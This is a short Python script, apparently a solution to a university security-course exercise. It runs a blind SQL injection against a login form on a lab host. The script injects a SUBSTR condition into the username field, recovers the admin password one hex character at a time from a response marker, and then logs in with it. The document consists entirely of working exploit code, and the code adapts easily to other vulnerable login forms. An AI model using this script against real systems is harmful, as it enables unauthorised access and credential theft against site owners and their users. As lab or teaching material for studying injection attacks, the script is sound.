import requests

LENGTH = 32

HEX = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f"]
global_session = requests.Session()
string_builder = ""


for j in range(LENGTH):
	for i in range(len(HEX)):
			response = global_session.post("https://t5.itsec.sec.in.tum.de/", data={"username": "admin\" AND \'" + HEX[i] + "\'=SUBSTR(password, " + str(j + 1) + ", " + str(1) + ") --", "password": ""})
			if "cheap tricks" in response.text:
				string_builder += HEX[i]
				break

final_response = global_session.post("https://t5.itsec.sec.in.tum.de/", data={"username": "admin", "password": string_builder})
print(final_response.text)
